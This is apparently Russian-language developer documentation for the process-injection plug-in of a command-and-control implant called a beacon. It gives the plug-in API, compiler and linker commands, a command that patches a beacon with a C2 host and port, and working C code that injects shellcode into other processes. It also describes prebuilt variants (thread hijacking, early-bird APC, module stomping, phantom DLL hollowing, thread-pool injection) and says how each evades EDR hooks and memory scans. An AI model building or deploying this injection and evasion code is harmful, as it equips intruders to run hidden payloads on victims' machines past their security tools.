Process Inject Kit

Process Inject Kit позволяет заменить встроенную логику инъекции шелкода на пользовательский PIC-блоб. Beacon вызывает инъекцию при любой операции, требующей запуска кода в чужом процессе: inject, inject_dll, spawnto и внутренние задачи (fork & run).

Архитектура

Beacon PE имеет специальные секции для инъекции:

СекцияСодержимоеШифруется во сне?
.textКод beacon'а (tasking, команды, крипто)Да
.injectКод kit_inject (диспетчер, default_inject, resolve)Нет
.injkitСлот для пользовательского шелкода (16384 байта)Нет
.co2cfgBeaconState (конфигурация)Нет

Поток выполнения

cmd_inject() / cmd_inject_dll() / cmd_spawnto()
  +-- kit_inject(target, pid, method, shellcode, ...)  [.inject section]
       |-- resolve_inject_ctx()        NtAllocate, NtWrite, NtProtect, NtCreateThreadEx...
       |-- IF .injkit patched:
       |       [4-byte EP offset] -> call user inject blob
       |   ELSE:
       |       call default_inject() (built-in alloc+write+protect+thread)
       +-- Return result + handles to caller

Формат блоба (.injkit)

Блоб — это извлечённая .text секция скомпилированного инъектора с 4-байтным заголовком:

[uint32_t LE: смещение от начала блоба до entry point]
[... весь код .text секции ...]

Поскольку линкер использует /MERGE:.rdata=.text, все данные (строки, таблицы) сливаются в .text перед кодом. Entry point обычно не на нулевом смещении — заголовок указывает точное смещение.

Максимальный размер блоба: 16368 байт (16384 - 16 байт сентинела). Если скомпилированный инъектор превышает этот размер, artifact-gen откажет в патчинге.

API (InjectCtx)

Beacon заполняет структуру InjectCtx и передаёт указатель на неё в инъектор. Определение в kit/processinject/process_inject_api.h:

Методы инъекции

#define INJECT_METHOD_THREAD    0   // CreateThread в удалённом процессе
#define INJECT_METHOD_APC       1   // QueueApcThread к потокам цели
#define INJECT_METHOD_SPAWN     2   // Создать жертвенный процесс + инъекция

Коды возврата

#define INJECT_OK               0   // Успех
#define INJECT_ERR_ALLOC        1   // VirtualAllocEx не удалось
#define INJECT_ERR_WRITE        2   // WriteProcessMemory не удалось
#define INJECT_ERR_PROTECT      3   // VirtualProtect не удалось
#define INJECT_ERR_THREAD       4   // Создание потока/APC не удалось
#define INJECT_ERR_PROCESS      5   // Целевой процесс недоступен
#define INJECT_ERR_RESOLVE      6   // Функция не найдена в ntdll/kernel32
#define INJECT_ERR_OTHER       99

InjectCtx

typedef struct InjectCtx {
    // ---- Цель (заполнено beacon'ом) ----
    HANDLE      target_process;     // HANDLE с полным доступом (или NULL для spawn)
    DWORD       target_pid;         // PID цели (0 для spawn)
    uint32_t    method_hint;        // INJECT_METHOD_* (подсказка, не обязательство)

    // ---- Payload ----
    const uint8_t*  payload;        // Шелкод (в памяти beacon'а)
    uint32_t        payload_len;    // Размер шелкода

    // ---- Выходные данные (заполняются пользовательским кодом) ----
    HANDLE      out_thread;         // Созданный поток (beacon ждёт / закрывает)
    HANDLE      out_process;        // Созданный процесс (только для SPAWN)
    void*       out_remote_base;    // Базовый адрес аллокации (для очистки)

    // ---- NT-функции (из ntdll.dll, разрезолвены beacon'ом) ----
    NTSTATUS (*NtAllocateVirtualMemory)(...);
    NTSTATUS (*NtWriteVirtualMemory)(...);
    NTSTATUS (*NtProtectVirtualMemory)(...);
    NTSTATUS (*NtCreateThreadEx)(...);
    NTSTATUS (*NtQueueApcThread)(...);
    NTSTATUS (*NtOpenProcess)(...);
    NTSTATUS (*NtCreateSection)(...);
    NTSTATUS (*NtMapViewOfSection)(...);
    NTSTATUS (*NtUnmapViewOfSection)(...);
    NTSTATUS (*NtClose)(...);
    NTSTATUS (*NtResumeThread)(...);
    NTSTATUS (*NtSuspendThread)(...);
    NTSTATUS (*NtGetContextThread)(...);
    NTSTATUS (*NtSetContextThread)(...);

    // ---- Kernel32 (для CreateProcess в spawn-методах) ----
    BOOL (*CreateProcessW)(...);
    BOOL (*TerminateProcess)(...);
    void* (*CreateToolhelp32Snapshot)(...);
    BOOL  (*Thread32First)(...);
    BOOL  (*Thread32Next)(...);
    HANDLE (*OpenThread)(...);
    BOOL  (*CloseHandle)(...);

    // ---- Вспомогательное ----
    HANDLE      self_process;       // (HANDLE)-1
    void*       ntdll_base;         // База ntdll.dll
    void*       kernel32_base;      // База kernel32.dll

    // ---- Spawn config ----
    const uint16_t* spawn_to;       // Путь к жертвенному процессу (UTF-16LE)
    uint32_t        spawn_to_len;   // Длина в WCHAR'ах (с нулём)
} InjectCtx;

Описание полей

ПолеОписание
target_process HANDLE к целевому процессу с PROCESS_ALL_ACCESS. Для SPAWN = NULL (инъектор сам создаёт процесс).
target_pid PID цели. Для APC используется при переборе потоков через Toolhelp32.
method_hint Подсказка от beacon'а — какой метод предпочтителен. Инъектор МОЖЕТ игнорировать и использовать свой.
payload / payload_len Шелкод для инъекции. Находится в памяти beacon'а (не удалённого процесса).
out_thread Обязательно заполнить при успехе: HANDLE к созданному потоку. Beacon ждёт его завершения.
out_process Заполнить для SPAWN: HANDLE жертвенного процесса. Beacon убьёт его после завершения.
out_remote_base Базовый адрес аллокации в удалённом процессе (для опциональной очистки).
Nt* указатели Готовые указатели на ntdll-функции. Резолвить самостоятельно не нужно.
CreateProcessW Указатель на kernel32!CreateProcessW. Для spawn-методов.
spawn_to Путь к жертвенному процессу из конфигурации beacon'а (UTF-16LE). Может быть NULL — инъектор использует notepad.exe по умолчанию.

Требования инжектора

Пользовательский код обязан:

  1. Выделить память в целевом процессе (RW) через NtAllocateVirtualMemory или NtCreateSection + NtMapViewOfSection.
  2. Записать payload через NtWriteVirtualMemory или shared section mapping.
  3. Сменить защиту на RX — NtProtectVirtualMemory(..., PAGE_EXECUTE_READ, ...).
  4. Запустить исполнение — NtCreateThreadEx, NtQueueApcThread, thread hijack (NtSuspendThread + NtSetContextThread + NtResumeThread) или иной метод.
  5. Заполнить выходные поля: out_thread (обязательно), out_process (для spawn), out_remote_base.
  6. Вернуть 0 при успехе или код ошибки INJECT_ERR_*.
ЗАПРЕЩЕНО вызывать функции beacon'а — его .text может быть зашифрован (если beacon спал перед вызовом). Все необходимые функции предоставлены через InjectCtx.

Правила PIC-кода

  • Никаких глобальных переменных и статических данных.
  • Никаких строковых литералов — только массивы на стеке.
  • Никакого CRT (malloc, printf, memcpy).
  • Entry point process_inject_entry должна быть первой определённой функцией в файле.
  • Все вспомогательные функции определяются после entry point.
  • Соглашение вызова: __cdecl.
  • Прототип: uint32_t __cdecl process_inject_entry(InjectCtx* ctx).
  • Максимальный размер: 16368 байт.

Сборка

Автоматическая (build_all.bat)

cd kit\processinject
build_all.bat

Скрипт компилирует все варианты из masks\ + default_inject.c для x64 и x86. Результат: bin\<name>.x64.bin и bin\<name>.x86.bin.

Ручная сборка одного инъектора

REM x64:
cl.exe /nologo /c /O2 /GS- /Zl /W3 /TC /I"kit\processinject" ^
    /Fo"inject.obj" my_inject.c
link.exe /nologo /NODEFAULTLIB /ENTRY:process_inject_entry ^
    /SUBSYSTEM:CONSOLE /SECTION:.text,ER /MERGE:.rdata=.text ^
    /OUT:inject.exe inject.obj
python kit\extract_section.py inject.exe .text inject.x64.bin

REM x86 (добавить /arch:IA32 и линковать x86_helpers.obj):
cl.exe /nologo /c /O2 /GS- /Zl /W3 /TC /arch:IA32 /I"kit\processinject" ^
    /Fo"inject.obj" my_inject.c
cl.exe /nologo /c /O2 /GS- /Zl /TC /Fo"helpers.obj" ^
    kit\x86_helpers.c
link.exe /nologo /NODEFAULTLIB /ENTRY:process_inject_entry ^
    /SUBSYSTEM:CONSOLE /SECTION:.text,ER /MERGE:.rdata=.text ^
    /OUT:inject.exe inject.obj helpers.obj
python kit\extract_section.py inject.exe .text inject.x86.bin

Применение инъектора к beacon'у

artifact-gen --input beacon64.exe --inject bin\section_map.x64.bin ^
    --host 10.0.0.5 --port 443 --key ... --out patched.exe

Готовые варианты

ИнъекторКаталогМетодОсобенности
default default_inject.c Alloc + Write + Protect + NtCreateThreadEx Стандартный, минимальный размер. Поддерживает все три hint'а.
section_map masks/section_map/ NtCreateSection + NtMapViewOfSection Без NtWriteVirtualMemory — payload через shared mapping. Обходит хуки на WriteVM.
thread_hijack masks/thread_hijack/ Suspend + SetContext + Resume Без создания нового потока — перехват существующего. Менее заметен для EDR.
early_bird masks/early_bird/ CreateProcess(SUSPENDED) + QueueApcThread(main thread) APC в главный поток до инициализации DLL. Обходит userland-хуки.
apc_ex2 masks/apc_ex2/ NtQueueApcThreadEx2 (alertable thread) Не требует suspended-потока. Windows 10 1809+.
phantom_hollow masks/phantom_hollow/ Phantom DLL hollowing Маппинг DLL из TxF-транзакции, перезапись секции. Выглядит как легитимный DLL.
module_stomp masks/module_stomp/ Module stomping Перезапись .text секции загруженной DLL. Инъекция выглядит как вызов в подписанном модуле.
poolparty masks/poolparty/ Thread pool work item injection Вставка work item в I/O completion port пула потоков цели. Windows 10+.
section_map — обходит inline-хуки на NtWriteVirtualMemory (payload через shared mapping).
thread_hijack — нет нового потока, меньше телеметрии в ETW.
phantom_hollow — аллокация маскируется под легитимный DLL (чистый memory scan).
module_stomp — RX-страницы принадлежат подписанному модулю (обходит ATP/VAD scan).
poolparty — нет APC/thread creation syscall, обходит большинство EDR-хуков.

Как написать свой инъектор

Шаблон

#include "process_inject_api.h"

// Forward declarations (helpers ПОСЛЕ entry point).
static void* alloc_write_protect(InjectCtx* ctx, HANDLE hp);

// ---- ENTRY POINT (должна быть ПЕРВОЙ функцией в файле) ----
uint32_t __cdecl process_inject_entry(InjectCtx* ctx) {
    // 1. Получить handle на процесс (или создать новый для SPAWN)
    HANDLE hp = ctx->target_process;
    if (!hp) return INJECT_ERR_PROCESS;

    // 2. Записать payload в целевой процесс
    void* remote = alloc_write_protect(ctx, hp);
    if (!remote) return INJECT_ERR_ALLOC;
    ctx->out_remote_base = remote;

    // 3. Запустить исполнение
    HANDLE hth = NULL;
    NTSTATUS ns = ctx->NtCreateThreadEx(
        &hth, 0x1FFFFF, NULL, hp, remote, NULL, 0, 0, 0, 0, NULL);
    if (ns < 0 || !hth) return INJECT_ERR_THREAD;

    ctx->out_thread = hth;
    return INJECT_OK;
}

// ---- Вспомогательные функции (ПОСЛЕ entry point) ----
static void* alloc_write_protect(InjectCtx* ctx, HANDLE hp) {
    PVOID base = NULL;
    SIZE_T sz = (SIZE_T)ctx->payload_len;

    NTSTATUS ns = ctx->NtAllocateVirtualMemory(
        hp, &base, 0, &sz, 0x3000, 0x04);
    if (ns < 0 || !base) return NULL;

    SIZE_T written = 0;
    ctx->NtWriteVirtualMemory(hp, base, (PVOID)ctx->payload,
                               (SIZE_T)ctx->payload_len, &written);

    PVOID pb = base; SIZE_T ps = sz; ULONG old = 0;
    ctx->NtProtectVirtualMemory(hp, &pb, &ps, 0x20, &old);
    return base;
}

Резолв дополнительных NT-функций

Если нужны функции, не включённые в InjectCtx, их можно получить через парсинг export directory по адресу ctx->ntdll_base или ctx->kernel32_base:

// Строки на стеке (PIC!)
char s[] = {'N','t','C','r','e','a','t','e',
            'T','r','a','n','s','a','c','t','i','o','n',0};
void* fn = pic_get_proc(ctx->ntdll_base, s);

Пример: стандартный инъектор (NtCreateThreadEx)

Файл default_inject.c — эталонная реализация, поддерживающая все три метода:

uint32_t __cdecl process_inject_entry(InjectCtx* ctx) {
    switch (ctx->method_hint) {
    case INJECT_METHOD_APC:   return do_apc(ctx);
    case INJECT_METHOD_SPAWN: return do_spawn(ctx);
    default:                  return do_thread(ctx);
    }
}

static uint32_t do_thread(InjectCtx* ctx) {
    void* rsc = alloc_write_protect(ctx, ctx->target_process);
    if (!rsc) return INJECT_ERR_ALLOC;
    ctx->out_remote_base = rsc;

    HANDLE hth = NULL;
    NTSTATUS ns = ctx->NtCreateThreadEx(
        &hth, 0x1FFFFF, NULL, ctx->target_process,
        rsc, NULL, 0, 0, 0, 0, NULL);
    if (ns < 0 || !hth) return INJECT_ERR_THREAD;
    ctx->out_thread = hth;
    return INJECT_OK;
}

Пример: NtMapViewOfSection (без WriteProcessMemory)

Файл masks/section_map/mask.c — инъекция через shared section:

uint32_t __cdecl process_inject_entry(InjectCtx* ctx) {
    // 1. NtCreateSection (размер = payload_len, PAGE_EXECUTE_READWRITE)
    HANDLE hSec = NULL;
    LARGE_INTEGER sec_sz; sec_sz.QuadPart = ctx->payload_len;
    ctx->NtCreateSection(&hSec, 0xF001F, NULL, &sec_sz, 0x40, 0x8000000, NULL);

    // 2. Map view в СЕБЯ (RW) — копируем payload
    PVOID local_view = NULL; SIZE_T view_sz = 0;
    ctx->NtMapViewOfSection(hSec, ctx->self_process,
        &local_view, 0, 0, NULL, &view_sz, 2, 0, 0x04);
    for (uint32_t i = 0; i < ctx->payload_len; ++i)
        ((uint8_t*)local_view)[i] = ctx->payload[i];

    // 3. Map view в ЦЕЛЬ (RX) — та же секция, другая защита
    PVOID remote_view = NULL; view_sz = 0;
    ctx->NtMapViewOfSection(hSec, ctx->target_process,
        &remote_view, 0, 0, NULL, &view_sz, 2, 0, 0x20);

    // 4. Unmap local, close section
    ctx->NtUnmapViewOfSection(ctx->self_process, local_view);
    ctx->NtClose(hSec);

    // 5. Create thread at remote_view
    HANDLE hth = NULL;
    ctx->NtCreateThreadEx(&hth, 0x1FFFFF, NULL,
        ctx->target_process, remote_view, NULL, 0, 0, 0, 0, NULL);
    ctx->out_thread = hth;
    ctx->out_remote_base = remote_view;
    return hth ? INJECT_OK : INJECT_ERR_THREAD;
}
Преимущество: NtWriteVirtualMemory не вызывается — payload попадает в цель через shared memory mapping. Большинство EDR-хуков на WriteProcessMemory не срабатывают.

Интеграция с beacon'ом

Как beacon вызывает инъектор

  1. Команда beacon'а (inject, inject_dll, spawnto) вызывает kit_inject() из секции .inject.
  2. kit_inject() заполняет InjectCtx: целевой процесс, payload, метод.
  3. Резолвит все NT/Kernel32 функции через GetProcAddress (строки на стеке).
  4. Проверяет секцию .injkit:
    • Если содержит сентинел CO2H_INJKIT__v1 — вызывает встроенный default_inject().
    • Если сентинел перезаписан — читает 4-байтное смещение до EP, прыгает на g_injkit_slot + offset.
  5. Получает результат (HANDLE'ы) и передаёт вызывающей команде.

Команды, использующие Process Inject Kit

КомандаОписаниеМетод по умолчанию
inject <pid> <shellcode> Инъекция шелкода в существующий процесс THREAD

Генерация артефакта через GUI

В диалоге генерации артефакта (кнопка Generate Artifact):

  1. Выбрать Inject Kit — кнопка Browse, указать .bin файл из kit/processinject/bin/.
  2. Можно комбинировать с Sleep Mask — оба патчатся одновременно.
  3. Кнопка Clear убирает инъектор (будет использоваться встроенный).

Секция .injkit — технические детали

  • Размер секции: 16384 байт (0x4000).
  • Характеристики: IMAGE_SCN_CNT_INITIALIZED_DATA | IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ.
  • Переменная g_injkit_slot объявлена как volatile — предотвращает оптимизацию компилятором (MSVC при /O2 может подставить compile-time константы вместо реальных чтений).
  • Не шифруется во время сна (sleep mask шифрует только .text и .rdata).
  • artifact-gen находит секцию по имени в PE section table и перезаписывает от начала.
